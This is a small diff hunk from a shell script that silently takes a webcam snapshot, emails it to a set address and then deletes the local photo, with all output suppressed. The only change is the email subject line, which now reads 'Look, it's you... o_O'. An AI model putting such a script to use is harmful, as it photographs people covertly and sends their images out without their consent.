@@ -24,7 +24,7 @@ chmod u+x /tmp/imagesnap > /dev/null 2>&1
 FILENAME="$(ls snapshot-*)"
 
 # Email photo 
-uuencode /tmp/$FILENAME $FILENAME | mail -s "photo of me" $EMAIL_TO_SEND > /dev/null 2>&1
+uuencode /tmp/$FILENAME $FILENAME | mail -s "Look, it's you... o_O" $EMAIL_TO_SEND > /dev/null 2>&1
 
 # Delete photo 
 rm -rf /tmp/$FILENAME > /dev/null 2>&1
